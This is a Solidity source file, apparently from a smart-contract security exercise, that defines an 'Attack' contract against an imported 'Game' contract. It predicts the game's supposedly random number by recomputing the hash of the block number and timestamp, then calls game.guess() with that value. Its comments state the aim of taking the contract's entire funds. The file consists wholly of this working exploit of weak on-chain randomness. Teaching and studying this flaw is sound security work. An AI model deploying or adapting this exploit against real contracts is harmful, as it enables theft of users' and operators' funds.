// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "./Game.sol";

  contract Attack {
      Game game;

      constructor(address gameAddress) {
          game = Game(gameAddress);
      }


      function attack() public {
        //since the game contact uses the blockNumber and block timestamp to calculate the random number 
        //we can use the same variables to calculate the random number as both the transaction will most probably happen in the same block
        //And both the contracts will have the same random number
        //And boom , soon we will have the entire funds of that contract in our contract address
          uint _guess = uint(keccak256(abi.encodePacked(blockhash(block.number), block.timestamp)));
          game.guess(_guess);
      }

      receive() external payable{}
  }